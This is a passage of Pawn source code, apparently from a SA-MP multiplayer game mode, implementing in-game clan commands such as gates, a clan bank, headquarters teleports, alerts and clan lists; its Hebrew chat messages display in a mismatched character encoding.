		if(cainfo[a][caMissiles]) return SendClientMessage(playerid,red," .Ёщ·я ь∙т° р· фшщьщэ °ў ЇЄэ рч·");
		cainfo[a][caMissileTo] = c, cainfo[a][caMissileStep] = false, cainfo[a][caMissiles] = true;
		format(string,sizeof(string)," .{%s}%s " @c(lightblue) "∙ыс∙ р· %s сч° ь∙т° р· фшщьщэ ьЄс° юЇўу· фўьря {%s}%s " @c(lightblue) "фўьря",ClanHexColor(c),claninfo[c][cname],CastlesAreas[a][caName],ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname]);
		SendClientMessageToAll(lightblue,string);
		for(new i = 0; i < 4; i++)
		{
		    new Float:x,Float:y,Float:z;
		    GetSObjectPos(cainfo[a][caMissile][i],x,y,z);
		    MoveSObject(cainfo[a][caMissile][i],x,y,(z+100.0),60.0);
		}
		return 1;
	}
	if(equal(cmd,"/clevel"))
	{
		if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря °∙ющ ыущ ьф∙·ю∙ сЇўхуф фцх");
		new dia[1600], c = 0;
		format(dia,sizeof(dia),"{%s}:%s фф°∙рх· ∙ьъ с·х° °юф %d сўьря" @c(white) "\n",ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname],playerinfo[playerid][lclan]);
		for(new i = 0; i < sizeof(ClanPermissions); i++) if(playerinfo[playerid][lclan] >= claninfo[playerinfo[playerid][clan]][cperms][i]) format(dia,sizeof(dia),"%s\n+ %02d) %s",dia,++c,ClanPermissions[i][clpName]);
		if(!c) format(dia,sizeof(dia),"%s\n" @c(red) ".рщя ьъ ф°∙рф ь∙хэ ЇЄхьф сўьря",dia);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фф°∙рх· ∙ьъ сўьря",dia,"OK","");
		return 1;
	}
	if(equal(cmd,"/teamkill"))
	{
		if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря °∙ющ ыущ ьф∙·ю∙ сЇўхуф фцх");
		if(!claninfo[playerinfo[playerid][clan]][csystems][clansys_tk]) return SendClientMessage(playerid,red," .\"хЄсх° ь·Ї°щш \"юЄ°ых· /clan рщя ьўьря ∙ьъ юЄ°ы· рЁшщ шщэ ўщь. ыущ ьўЁх·, ьчї");
		ToggleClanTeamKill(playerinfo[playerid][clan],playerid);
		new string[M_S];
		format(string,sizeof(string)," .%s р· юЄ°ы· фрЁшщ шщэ ўщь",claninfo[playerinfo[playerid][clan]][csystemparam][clansys_tk] ? ("фЇЄь·") : ("ыщсщ·"));
		SendClientMessage(playerid,claninfo[playerinfo[playerid][clan]][csystemparam][clansys_tk] ? green : red,string);
		return 1;
	}
	if(equal(cmd,"/alert"))
	{
		if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря °∙ющ ыущ ьф∙·ю∙ сЇўхуф фцх");
		if(!claninfo[playerinfo[playerid][clan]][csystems][clansys_alert]) return SendClientMessage(playerid,red," .\"хЄсх° ь·Ї°щш \"юЄ°ых· /clan рщя ьўьря ∙ьъ юЄ°ы· рцЄўф. ыущ ьўЁх·, ьчї");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /alert [on/off/mute] :Ўх°· ф∙щюх∙");
		new string[M_S], tmp = claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert];
		if(equal(cmd,"on"))
		{
			if(claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert]) return SendClientMessage(playerid,red," .юЄ°ы· фрцЄўх· ыс° ЇхЄь·");
			claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert] = 1;
			SendClientMessage(playerid,green," .фЇЄь· р· юЄ°ы· фрцЄўх·");
			format(string,sizeof(string)," * [/alert] фЇЄщь р· юЄ°ы· фрцЄўх· ∙ь фюЇўуф %s",GetName(playerid));
		}
		else if(equal(cmd,"off"))
		{
			if(!claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert]) return SendClientMessage(playerid,red," .юЄ°ы· фрцЄўх· ьр ЇхЄь·");
			claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert] = 0;
			SendClientMessage(playerid,green," .ыщсщ· р· юЄ°ы· фрцЄўх·");
			format(string,sizeof(string)," * [/alert] ыщсф р· юЄ°ы· фрцЄўх· ∙ь фюЇўуф %s",GetName(playerid));
		}
		else if(equal(cmd,"mute"))
		{
			if(!claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert]) return SendClientMessage(playerid,red," .юЄ°ы· фрцЄўх· ьр ЇхЄь·");
			if(!claninfo[playerinfo[playerid][clan]][calert][1]) return SendClientMessage(playerid,red," .фрцЄўф ьр ЇхЄь·: рщя юф ьф∙·щў");
			claninfo[playerinfo[playerid][clan]][calert][1] = 0;
			SendClientMessage(playerid,green," .ф∙·ў· р· фрцЄўф");
			format(string,sizeof(string)," * [/alert] ф∙·щў р· юЄ°ы· фрцЄўх· ∙ь фюЇўуф %s",GetName(playerid));
		}
		ClanNotification(playerinfo[playerid][clan],string);
		if(tmp != claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert])
		{
			new f[64];
			format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
			format(string,sizeof(string),"System%dParam",ClanSystems[clansys_alert][clsUniqueID]);
			fsetint(f,string,claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert]);
		}
		return 1;
	}
	if(equal(cmd,"/camoff"))
	{
		if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря °∙ющ ыущ ьф∙·ю∙ сЇўхуф фцх");
		if(playerinfo[playerid][clancam] == -1) return SendClientMessage(playerid,red," .р·ф ьр ЎхЇф сюЎью· ўьря");
		ClanCameraOff(playerid);
		return 1;
	}
	if(equal(cmd,"/ogate") || equal(cmd,"/og"))
	{
		new theGate = -1, aclan[MAX_CLANS], clans = 0;
		if(playerinfo[playerid][clan] > 0) aclan[clans++] = playerinfo[playerid][clan];
		for(new i = 1; i <= MAXCLANS; i++)
		{
			if(i == playerinfo[playerid][clan]) continue;
			if(playerinfo[playerid][admin] >= 19 || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ")) || claninfo[playerinfo[playerid][clan]][cpeace][i] || claninfo[i][cruler] == playerinfo[playerid][clan]) aclan[clans++] = i;
		}
		for(new c = 0; c < clans && theGate == -1; c++) for(new i = 0; i < claninfo[aclan[c]][cobjects] && theGate == -1; i++) if(GetPlayerDistanceToPoint(playerid,objectinfo[claninfo[aclan[c]][cobject][i]][opos][0],objectinfo[claninfo[aclan[c]][cobject][i]][opos][1]) <= 14.0 && objectinfo[claninfo[aclan[c]][cobject][i]][omoving][0] && IsValidSObject(claninfo[aclan[c]][cobject][i])) theGate = claninfo[aclan[c]][cobject][i];
		if(theGate == -1) return SendClientMessage(playerid,red," .рщя ьщуъ ∙хэ рхсщщўш фЁщ·я ьЇ·щчф");
		if(playerinfo[playerid][admin] < 19 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ")))
		{
			if(playerinfo[playerid][clan] == 0 && !(objectinfo[theGate][omoving][1] == 100 && IsPlayerMAdmin(playerid))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ь∙щюх∙ сЇўхуф цх");
			if(objectinfo[theGate][omoving][1] != playerinfo[playerid][clan] && !claninfo[playerinfo[playerid][clan]][cpeace][objectinfo[theGate][omoving][1]] && claninfo[objectinfo[theGate][omoving][1]][cruler] != playerinfo[playerid][clan]/* && !(objectinfo[theGate][omoving][1] == 100 && IsPlayerMAdmin(playerid))*/) return SendClientMessage(playerid,red," .фрхсщщўш фцф ьр ∙щщъ ьўьря ∙ьъ");
		}
		if(objectinfo[theGate][omoving][2]) return SendClientMessage(playerid,red," .фрхсщщўш фцф ыс° Ї·хч");
		StopSObject(theGate);
		MoveSObject(theGate,objectinfo[theGate][omoveto][0],objectinfo[theGate][omoveto][1],objectinfo[theGate][omoveto][2],objectinfo[theGate][omoveto][3]);
		objectinfo[theGate][omoving][2] = 1;
		PlaySound(playerid,1153);
		playerinfo[playerid][hearinggate] = theGate;
		return 1;
	}
	if(equal(cmd,"/cgate") || equal(cmd,"/cg"))
	{
		new theGate = -1, aclan[MAX_CLANS], clans = 0;
		if(playerinfo[playerid][clan] > 0) aclan[clans++] = playerinfo[playerid][clan];
		for(new i = 1; i <= MAXCLANS; i++)
		{
			if(i == playerinfo[playerid][clan]) continue;
			if(playerinfo[playerid][admin] >= 19 || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ")) || claninfo[playerinfo[playerid][clan]][cpeace][i] || claninfo[i][cruler] == playerinfo[playerid][clan]) aclan[clans++] = i;
		}
		for(new c = 0; c < clans && theGate == -1; c++) for(new i = 0; i < claninfo[aclan[c]][cobjects] && theGate == -1; i++) if(GetPlayerDistanceToPoint(playerid,objectinfo[claninfo[aclan[c]][cobject][i]][opos][0],objectinfo[claninfo[aclan[c]][cobject][i]][opos][1]) <= 14.0 && objectinfo[claninfo[aclan[c]][cobject][i]][omoving][0] && IsValidSObject(claninfo[aclan[c]][cobject][i])) theGate = claninfo[aclan[c]][cobject][i];
		if(theGate == -1) return SendClientMessage(playerid,red," .рщя ьщуъ ∙хэ рхсщщўш фЁщ·я ьётщ°ф");
		if(playerinfo[playerid][admin] < 19 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ")))
		{
			if(playerinfo[playerid][clan] == 0 && !(objectinfo[theGate][omoving][1] == 100 && IsPlayerMAdmin(playerid))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ь∙щюх∙ сЇўхуф цх");
			if(objectinfo[theGate][omoving][1] != playerinfo[playerid][clan] && !claninfo[playerinfo[playerid][clan]][cpeace][objectinfo[theGate][omoving][1]] && claninfo[objectinfo[theGate][omoving][1]][cruler] != playerinfo[playerid][clan]/* && !(objectinfo[theGate][omoving][1] == 100 && IsPlayerMAdmin(playerid))*/) return SendClientMessage(playerid,red," .фрхсщщўш фцф ьр ∙щщъ ьўьря ∙ьъ");
		}
		if(!objectinfo[theGate][omoving][2]) return SendClientMessage(playerid,red," .фрхсщщўш фцф ыс° ётх°");
		StopSObject(theGate);
		MoveSObject(theGate,objectinfo[theGate][opos][0],objectinfo[theGate][opos][1],objectinfo[theGate][opos][2],objectinfo[theGate][omoveto][3]);
		objectinfo[theGate][omoving][2] = 0;
		PlaySound(playerid,1153);
		playerinfo[playerid][hearinggate] = theGate;
		return 1;
	}
	if(equal(cmd,"/ogateall") || equal(cmd,"/ogall"))
	{
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ьсщЎхЄ Їўхуф цх");
		if(!claninfo[playerinfo[playerid][clan]][hashq]) return SendClientMessage(playerid,red," .ыущ ьсЎЄ Їўхуф цх, ьўьря ∙ьъ Ў°щыф ьфщх· юЇўуф");
		if(!claninfo[playerinfo[playerid][clan]][cobjects]) return SendClientMessage(playerid,red," .рщя ьюЇўуф ∙ьъ рхсщщўшщэ");
		if(!claninfo[playerinfo[playerid][clan]][csystems][clansys_security]) return SendClientMessage(playerid,red," .ьўьря ∙ьъ рщя юЄ°ы· ∙ьщшф срхсщщўшщэ");
		new object[10], objects = 0, string[128];
		for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cobjects]; i++) if(objectinfo[claninfo[playerinfo[playerid][clan]][cobject][i]][omoving][0] && !objectinfo[claninfo[playerinfo[playerid][clan]][cobject][i]][omoving][2]) object[objects++] = claninfo[playerinfo[playerid][clan]][cobject][i];
		if(!objects) return SendClientMessage(playerid,red," .ыь фрхсщщўшщэ ыс° Ї·хчщэ / ьўьря ∙ьъ рщя рхсщщўшщэ ццщэ");
		for(new i = 0; i < objects; i++)
		{
			StopSObject(object[i]);
			MoveSObject(object[i],objectinfo[object[i]][omoveto][0],objectinfo[object[i]][omoveto][1],objectinfo[object[i]][omoveto][2],objectinfo[object[i]][omoveto][3]);
			objectinfo[object[i]][omoving][2] = 1;
		}
		format(string,sizeof(string)," .Ї·ч р· ыь фрхсщщўшщэ ∙ь фюЇўуф %s",GetName(playerid));
		for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
		return 1;
	}
	if(equal(cmd,"/cgateall") || equal(cmd,"/cgall"))
	{
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ьсщЎхЄ Їўхуф цх");
		if(!claninfo[playerinfo[playerid][clan]][hashq]) return SendClientMessage(playerid,red," .ыущ ьсЎЄ Їўхуф цх, ьўьря ∙ьъ Ў°щыф ьфщх· юЇўуф");
		if(!claninfo[playerinfo[playerid][clan]][cobjects]) return SendClientMessage(playerid,red," .рщя ьюЇўуф ∙ьъ рхсщщўшщэ");
		if(!claninfo[playerinfo[playerid][clan]][csystems][clansys_security]) return SendClientMessage(playerid,red," .ьўьря ∙ьъ рщя юЄ°ы· ∙ьщшф срхсщщўшщэ");
		new object[10], objects = 0, string[128];
		for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cobjects]; i++) if(objectinfo[claninfo[playerinfo[playerid][clan]][cobject][i]][omoving][0] && objectinfo[claninfo[playerinfo[playerid][clan]][cobject][i]][omoving][2]) object[objects++] = claninfo[playerinfo[playerid][clan]][cobject][i];
		if(!objects) return SendClientMessage(playerid,red," .ыь фрхсщщўшщэ ыс° ётх°щэ / ьўьря ∙ьъ рщя рхсщщўшщэ ццщэ");
		for(new i = 0; i < objects; i++)
		{
			StopSObject(object[i]);
			MoveSObject(object[i],objectinfo[object[i]][opos][0],objectinfo[object[i]][opos][1],objectinfo[object[i]][opos][2],objectinfo[object[i]][omoveto][3]);
			objectinfo[object[i]][omoving][2] = 0;
		}
		format(string,sizeof(string)," .ёт° р· ыь фрхсщщўшщэ ∙ь фюЇўуф %s",GetName(playerid));
		for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
		return 1;
	}
	if(equal(cmd,"/cdeposit"))
	{
		if(playerinfo[playerid][clan] == 0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ь∙щюх∙ сЇўхуф цх");
		if(claninfo[playerinfo[playerid][clan]][clbank]) return SendClientMessage(playerid,red," .фсЁў ∙ь фўьря ∙ьъ ЁЄхь");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		//if(cpinfo[playerinfo[playerid][cp]][cppar] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .фсЁў фцф ьр ∙щщъ ьўьря ∙ьъ");
		if(!HasClanPermission(playerid,clanperm_deposit)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /cdeposit [amount] :Ўх°· ф∙щюх∙");
		new amount = strval(cmd), string[M_S];
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .ёыхэ фЇўуф ∙тхщ");
		if(amount+claninfo[playerinfo[playerid][clan]][cbank] > claninfo[playerinfo[playerid][clan]][cmaxbank])
		{
			format(string,sizeof(string)," .$%d сЁў фўьря щыхь ьфыщь Єу",claninfo[playerinfo[playerid][clan]][cmaxbank]);
			return SendClientMessage(playerid,red,string);
		}
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		SetTimerEx("CanP",5000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		format(string,sizeof(string),"%s: deposit %d$ (%d$ -> %d$)",claninfo[playerinfo[playerid][clan]][cname],amount,claninfo[playerinfo[playerid][clan]][cbank],claninfo[playerinfo[playerid][clan]][cbank]+amount);
		Log("Clans",playerid,string);
		GiveMoney(playerid,0-amount,31);
		claninfo[playerinfo[playerid][clan]][cbank] += amount;
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
		fsetint(string,"Bank",claninfo[playerinfo[playerid][clan]][cbank]);
		format(string,sizeof(string)," .фЇўу· %d$ сч∙схя фсЁў ∙ь фўьря ∙ьъ, ыЄ· щ∙ сч∙схя %d$",amount,claninfo[playerinfo[playerid][clan]][cbank]);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," фЇўщу $%d %s",amount,GetName(playerid));
		CBankLog(playerinfo[playerid][clan],string);
		return 1;
	}
	if(equal(cmd,"/cwithdraw"))
	{
		new amount, string[M_S];
		if(playerinfo[playerid][clan] == 0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ь∙щюх∙ сЇўхуф цх");
		if(claninfo[playerinfo[playerid][clan]][clbank]) return SendClientMessage(playerid,red," .фсЁў ∙ь фўьря ∙ьъ ЁЄхь");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		//if(cpinfo[playerinfo[playerid][cp]][cppar] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .фсЁў фцф ьр ∙щщъ ьўьря ∙ьъ");
		if(!HasClanPermission(playerid,clanperm_withdraw)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /cwithdraw [amount] :Ўх°· ф∙щюх∙");
		amount = strval(cmd);
		if(amount < 1 || amount > claninfo[playerinfo[playerid][clan]][cbank]) return SendClientMessage(playerid,red," .ёыхэ фхЎрф ∙тхщ");
		GiveMoney(playerid,amount,31);
		format(string,sizeof(string),"%s: withdraw %d$ (%d$ -> %d$)",claninfo[playerinfo[playerid][clan]][cname],amount,claninfo[playerinfo[playerid][clan]][cbank],claninfo[playerinfo[playerid][clan]][cbank]-amount);
		Log("Clans",playerid,string);
		claninfo[playerinfo[playerid][clan]][cbank] -= amount;
		format(string,sizeof(string)," .ю∙ы· %d$ юч∙схя фсЁў ∙ь фўьря ∙ьъ, ыЄ· щ∙ сч∙схя %d$",amount,claninfo[playerinfo[playerid][clan]][cbank]);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
		fsetint(string,"Bank",claninfo[playerinfo[playerid][clan]][cbank]);
		format(string,sizeof(string)," фхЎщр $%d %s",amount,GetName(playerid));
		CBankLog(playerinfo[playerid][clan],string);
		return 1;
	}
	if(equal(cmd,"/cbalance"))
	{
		new string[M_S];
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ь∙щюх∙ сЇўхуф цх");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		if(cpinfo[playerinfo[playerid][cp]][cppar] != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .фсЁў фцф ьр ∙щщъ ьўьря ∙ьъ");
		format(string,sizeof(string)," .%d$ сч∙схя фсЁў ∙ь фўьря ∙ьъ щ∙",claninfo[playerinfo[playerid][clan]][cbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/clans"))
	{
		new clans = 0, clanCM = 0, list[M_S_D+512];
		for(new i = 1; i < MAX_CLANS; i++) if(claninfo[i][cvalid]) clans++;
		if(!clans) return SendClientMessage(playerid,red," .рщя ўьрЁщэ с∙°· ы°тЄ");
		format(list,sizeof(list),@c(lightblue) " - :(ўьрЁщэ с∙°· (%d -\n",clans);
		for(new i = 1; i < MAX_CLANS; i++) if(claninfo[i][cvalid])
		{
			clanCM = 0;
			for(new ii = 0; ii < MAX_PLAYERS_; ii++) if(IsPlayerConnected(ii) && playerinfo[ii][clan] == i) clanCM++;
			format(list,sizeof(list),"%s\n{%s} Х %s (∙чўЁщэ ючхс°щэ: %d, юёЇ° фўьря: %02d, шёшщэ: %s)",list,ClanHexColor(i),claninfo[i][cname],clanCM,i,claninfo[i][ctest] ? ("Ї·хч") : ("ётх°"));
		}
		format(list,sizeof(list),"%s\n\n" @c(grey) "(/hqlist :ь°∙щю· фюЇўух·)",list);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· фўьрЁщэ",list,"OK","");
		return 1;
	}
	if(equal(cmd,"/buyhq"))
	{
	    if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ь∙щюх∙ сЇўхуф цх");
        if(claninfo[playerinfo[playerid][clan]][hashq]) return SendClientMessage(playerid,red," .ьўьря ∙ьъ щ∙ юЇўуф");
		if(playerinfo[playerid][lclan] < 5) return SendClientMessage(playerid,red," .°ыщ∙· юЇўуф щыхьф ьф·сЎЄ °ў с°ю· ўьря 5");
		if(playerinfo[playerid][invhq] == -1 || viewhqinfo[playerinfo[playerid][invhq]][hqowner] != -1) return SendClientMessage(playerid, red, " .Єьщъ ьфщх· срцх° юЇўуф Єь юЁ· ь°ых∙ рх·ф");
		if(GetMoney(playerid) < viewhq_prices[viewhqinfo[playerinfo[playerid][invhq]][hqsize]])
		{
    		new str[M_S];
			format(str, sizeof(str), " .рщя ьъ юёЇщў ыёє. Єь юЁ· ьўЁх· юЇўуф цх ·Ўш°ъ %s$", Comma(viewhq_prices[viewhqinfo[playerinfo[playerid][invhq]][hqsize]]));
			SendClientMessage(playerid, red, str);
			return 1;
		}
		return SellHQForClan(playerid, playerinfo[playerid][clan], playerinfo[playerid][invhq]);
	}
	if(equal(cmd,"/hq"))
	{
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ь∙щюх∙ сЇўхуф цх");
		if(!claninfo[playerinfo[playerid][clan]][hashq]) return SendClientMessage(playerid,red," .ьўьря ∙ьъ рщя юЇўуф");
		if(!HasClanPermission(playerid,clanperm_hq)) return 1;
		new string[M_S];
		format(string,sizeof(string),"/%s",claninfo[playerinfo[playerid][clan]][ccmd]);
		if(command(playerid,string))
		{
			playerinfo[playerid][teleportedhq] = 1;
			format(string,sizeof(string)," (/%s) ∙хт°· ьюЇўу· фўьря ∙ьъ",claninfo[playerinfo[playerid][clan]][ccmd]);
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/hqavg"))
	{
		new s = strval(strtok(cmdtext,idx)), Float:p[3];
		GetHQAveragePos(playerinfo[playerid][clan],p[0],p[1],p[2],!s ? -1 : playerid);
		if(!s) SetPlayerPos(playerid,p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/phq"))
	{
		if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўьря ь∙щюх∙ сЇўхуф цх");
		new c, string[M_S], enterstate = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /phq [clan name] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
		if(c == -1) return SendClientMessage(playerid,red," .юёЇ° ўьря ∙тхщ");
		if(!claninfo[c][hashq]) return SendClientMessage(playerid,red," .ьўьря цф рщя юЇўуф");
		enterstate = (c == playerinfo[playerid][clan] ? 1 : 0);
		if(!enterstate && claninfo[c][cpeace][playerinfo[playerid][clan]]) enterstate = 2;
		if(!enterstate && claninfo[c][cruler] == playerinfo[playerid][clan]) enterstate = 3;
		if(!CanBeTeleported(playerid)) return 1;
		switch(enterstate)
		{
			case 1: SendClientMessage(playerid,green," .р·ф юх°∙ф ьф∙·т° ьюЇўуф цх ыщ фщр ∙ь фўьря ∙ьъ");
			case 2: SendClientMessage(playerid,green," .р·ф юх°∙ф ьф∙·т° ьюЇўуф цх ыщ фўьря ∙ьф с∙ьхэ рщ·ъ");
			case 3: SendClientMessage(playerid,green," .р·ф юх°∙ф ьф∙·т° ьюЇўуф цх ыщ фўьря ∙ьъ ∙хьш сф");
			default: return SendClientMessage(playerid,red," .рщЁъ юх°∙ф ьф∙·т° ьюЇўуф фцх");
		}
		playerinfo[playerid][teleportedhq] = 1;
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				SetPlayerPos(playerid,claninfo[c][chq][0]+floatrand(-1.0,1.0),claninfo[c][chq][1]+floatrand(-1.0,1.0),claninfo[c][chq][2]);
				SetPlayerFacingAngle(playerid,claninfo[c][chq][3]);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),claninfo[c][chqv][0]+floatrand(-3.0,3.0),claninfo[c][chqv][1]+floatrand(-3.0,3.0),claninfo[c][chqv][2],playerid);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),claninfo[c][chqv][3]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		format(string,sizeof(string),"~y~]~h~%s ~n~~h~headquarter~y~]",claninfo[c][cname]);
		GameTextForPlayer(playerid,string,1500,4);
		format(string,sizeof(string)," !%s с°хъ фср ьюЇўу·",claninfo[c][cname]);
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/hqlist"))
	{
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· юЇўух· фўьрЁщэ",hqlistinfo,"OK","");
		return 1;
	}
	if(equal(cmd,"/cstats"))
	{
		new cid = 0;
		cmd = strtok(cmdtext,idx), cid = 0;
		if(!cmd[0]) return SendClientMessage(playerid, white, " /cstats [clan name] :Ўх°· ф∙щюх∙");
		if(!strlen(cmd)) if(playerinfo[playerid][clan] > 0) cid = playerinfo[playerid][clan]; else SendClientMessage(playerid,white," /cstats [clan name] :Ўх°· ф∙щюх∙");
		cid = clannumber(cmd);
		if(!cid) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		ShowClanStats(playerid,cid,dialog_ni);
		return 1;
	}
	if(equal(cmd,"/cplayers"))
	{
	    if(playerinfo[playerid][admin] != 20) return SendClientMessage(playerid, red, " .рхЇЎщф цх чёхюф Ёыхя ьЄы∙щх");
		new cid = 0, c = 0, data[512], n[MAX_PLAYER_NAME];
		cmd = strtok(cmdtext,idx), cid = 0;
		if(!strlen(cmd)) if(playerinfo[playerid][clan] > 0) cid = playerinfo[playerid][clan]; else SendClientMessage(playerid,white," /cplayers [clan name] :Ўх°· ф∙щюх∙");
		cid = clannumber(cmd);
		if(!cid) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		format(data,sizeof(data),"{%s}[%02d/%02d] :%s ∙чўЁщ фўьря\n",ClanHexColor(cid),ClanPList_Count(cid),max_clan_members,claninfo[cid][cname]);
		for(new i = 1; i <= max_clan_members; i++)
		{
			format(n,sizeof(n),ClanPList_Player(cid,i));
			if(!equal(n,"None"))
			{
				c++;
				format(data,sizeof(data),"%s\n%d) %s",data,c,n);
			}
		}
		if(!c) format(data,sizeof(data),"%s\n.сўьря цф рщя ∙чўЁщэ",data);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· ∙чўЁщэ сўьря",data,"ётх°","");
		return 1;
	}/*
	if(equal(cmd,"/cinvite"))
	{
		if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .р·ф ьр сўьря °∙ющ");
		if(!HasClanPermission(playerid,clanperm_invite)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /cinvite [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфцющя р· ЄЎюъ");
		new string[M_S];
		if(playerinfo[id][clan] > 0)
		{
			format(string,sizeof(string)," .ыс° ЁюЎр сўьря %s",GetName(id));
			return SendClientMessage(playerid,red,string);
		}
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
		format(string,sizeof(string)," .ьўьря %s фцюЁ· р·",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," /caccept :ьфЎш°Їх· ,\"%s\" ∙ьч ьъ фцюЁф ьўьря %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
		SendClientMessage(id,green,string);
		playerinfo[id][iclan] = playerinfo[playerid][clan];
		playerinfo[id][lastrec] = 5;
		return 1;
	}
	if(equal(cmd,"/caccept"))
	{
 		if(playerinfo[playerid][iclan] == 0) return SendClientMessage(playerid,red," .ьр фхцюЁ· ь∙хэ ўьря");
		if(playerinfo[playerid][clan] != 0) return SendClientMessage(playerid,red," .р·ф ыс° сўьря");
